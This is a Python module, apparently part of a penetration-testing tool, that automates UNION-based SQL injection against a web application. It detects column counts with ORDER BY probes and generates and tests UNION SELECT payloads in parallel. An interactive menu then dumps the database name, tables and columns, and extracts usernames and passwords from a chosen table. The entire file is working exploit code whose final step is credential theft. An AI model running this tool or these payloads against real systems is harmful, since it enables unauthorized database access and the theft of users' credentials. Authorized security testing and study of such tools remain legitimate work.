import requests
from urllib.parse import quote_plus
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt
from bs4 import BeautifulSoup
from .utils import console
from .constants import UNION_PAYLOAD_TEMPLATES, DEFAULT_PARAMS, DEFAULT_MARKER

# --- Payload generation ---
def generate_union_payloads(column_count, marker):
    payloads = []
    for i in range(column_count):
        cols = ["NULL"] * column_count
        cols[i] = f"'{marker}'"
        col_str = ", ".join(cols)
        for template in UNION_PAYLOAD_TEMPLATES:
            payloads.append(template.replace("{cols}", col_str))
    return payloads

# --- Detect column count ---
def detect_column_count(url):
    for i in range(1, 21):
        payload = f"' ORDER BY {i}--"
        test_url = url.replace("INJECT_HERE", quote_plus(payload))
        try:
            res = requests.get(test_url, timeout=10)
            if res.status_code != 200 or "error" in res.text.lower():
                return i - 1
        except requests.RequestException:
            continue
    return 0

# --- Test single payload ---
def test_payload(url, payload, marker):
    test_url = url.replace("INJECT_HERE", quote_plus(payload))
    try:
        res = requests.get(test_url, timeout=10)
        if res.status_code == 200 and marker in res.text:
            return payload
    except requests.RequestException:
        return None
    return None

# --- Extract text safely ---
def extract_text_from_response(res, marker):
    soup = BeautifulSoup(res.text, "html.parser")
    text = soup.get_text(separator="\n")
    lines = [line.strip() for line in text.splitlines() if line.strip()]
    marker_lines = [line for line in lines if marker in line]
    return marker_lines or ["[!] Could not find marker in response"]

# --- Extraction helpers ---
def extract_db_name(url, column_count, marker):
    cols = ["NULL"] * column_count
    cols[1] = "database()"
    cols[2] = f"'{marker}'"
    payload = f"' UNION SELECT {', '.join(cols)}--"
    test_url = url.replace("INJECT_HERE", quote_plus(payload))
    res = requests.get(test_url)
    result = extract_text_from_response(res, marker)
    console.print("[+] Database name:", style="bold green")
    for line in result:
        console.print(line)

def extract_table_names(url, column_count, marker):
    cols = ["NULL"] * column_count
    cols[1] = "table_name"
    cols[2] = f"'{marker}'"
    payload = f"' UNION SELECT {', '.join(cols)} FROM information_schema.tables WHERE table_schema=database()--"
    test_url = url.replace("INJECT_HERE", quote_plus(payload))
    res = requests.get(test_url)
    result = extract_text_from_response(res, marker)
    console.print("[+] Table names:", style="bold green")
    for line in result:
        console.print(line)

def extract_column_names(url, column_count, marker):
    table = Prompt.ask("[?] Enter table name")
    cols = ["NULL"] * column_count
    cols[1] = "column_name"
    cols[2] = f"'{marker}'"
    payload = f"' UNION SELECT {', '.join(cols)} FROM information_schema.columns WHERE table_name='{table}'--"
    test_url = url.replace("INJECT_HERE", quote_plus(payload))
    res = requests.get(test_url)
    result = extract_text_from_response(res, marker)
    console.print(f"[+] Columns in table '{table}':", style="bold green")
    for line in result:
        console.print(line)

def extract_user_credentials(url, column_count, marker):
    table = Prompt.ask("[?] Enter table name containing credentials")
    user_col = Prompt.ask("[?] Enter username column")
    pass_col = Prompt.ask("[?] Enter password column")
    cols = ["NULL"] * column_count
    cols[0] = user_col
    if column_count > 1:
        cols[1] = pass_col
    cols[2] = f"'{marker}'"
    payload = f"' UNION SELECT {', '.join(cols)} FROM {table}--"
    test_url = url.replace("INJECT_HERE", quote_plus(payload))
    res = requests.get(test_url)
    result = extract_text_from_response(res, marker)
    console.print("[+] User credentials:", style="bold green")
    for line in result:
        console.print(line)

# --- Action menu ---
def prompt_for_action(test_url, column_count, marker):
    while True:
        console.print("\n[bold magenta]Select an action:[/bold magenta]")
        console.print("[1] Extract current database name")
        console.print("[2] Extract table names")
        console.print("[3] Extract column names from a table")
        console.print("[4] Extract user credentials")
        console.print("[5] Exit")
        choice = Prompt.ask("Choose an option", choices=["1","2","3","4","5"])
        if choice == "1":
            extract_db_name(test_url, column_count, marker)
        elif choice == "2":
            extract_table_names(test_url, column_count, marker)
        elif choice == "3":
            extract_column_names(test_url, column_count, marker)
        elif choice == "4":
            extract_user_credentials(test_url, column_count, marker)
        elif choice == "5":
            console.print("[+] Exiting action menu.", style="bold green")
            break

# --- Main Union SQLi runner ---
def run_union_sqli(base_url):
    console.print("[bold cyan]--- UNION-based SQL Injection Tester ---[/bold cyan]")

    directory = Prompt.ask("[?] Directory to test for UNION SQLi")
    url_template = f"{base_url.rstrip('/')}/{directory.strip('/')}?INJECT_HERE"

    marker = Prompt.ask(f"[?] Marker string to inject (default={DEFAULT_MARKER})", default=DEFAULT_MARKER)

    param_list = Prompt.ask("[?] Parameter names (comma-separated) or press enter for default", default="").split(",")
    param_list = [p.strip() for p in param_list if p.strip()] or DEFAULT_PARAMS

    found = False
    test_url = None
    column_count = 0

    for param in param_list:
        url = url_template.replace("INJECT_HERE", param + "=INJECT_HERE")
        column_count = detect_column_count(url)
        if column_count == 0:
            continue

        payloads = generate_union_payloads(column_count, marker)
        working_payloads = []

        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=5) as executor:
            future_to_payload = {executor.submit(test_payload, url, p, marker): p for p in payloads}
            for future in as_completed(future_to_payload):
                result = future.result()
                if result:
                    working_payloads.append(result)

        if working_payloads:
            console.print(f"[bold green][+] UNION SQLi detected on parameter: {param}[/bold green]")
            console.print(f"[bold green][+] Column count: {column_count}[/bold green]")
            table = Table(title="Working Payloads")
            table.add_column("Payload", style="white")
            for p in working_payloads:
                table.add_row(p)
            console.print(table)
            found = True
            test_url = url
            break

    if not found:
        console.print("[bold red][-] No UNION-based SQLi detected on given parameters.[/bold red]")
        return

    # Automatically prompt for extraction actions
    prompt_for_action(test_url, column_count, marker)
